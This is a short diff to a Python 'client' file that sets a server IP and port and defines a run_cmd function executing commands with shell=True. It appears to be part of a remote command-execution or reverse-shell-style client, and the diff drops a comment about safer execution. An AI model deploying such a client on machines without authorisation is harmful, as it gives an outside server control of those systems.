@@ -1,12 +1,12 @@
 """
-Client filegit
+Client file
 """
 import socket
 import subprocess
 import shlex
 import os
 
-SERVER = "192.168.193.113"
+SERVER = "192.168.193.113" #Specify the Server IP here
 PORT = 6769
 END_MARKER = b"\n--END--\n"
 
@@ -14,7 +14,6 @@ def run_cmd(cmd):
     """
     Run a command and return bytes of stdout+stderr.
     We keep shell=True for compatibility with common shell constructs.
-    If you prefer safer execution, use shlex.split() + shell=False.
     """
     try:
         completed = subprocess.run(
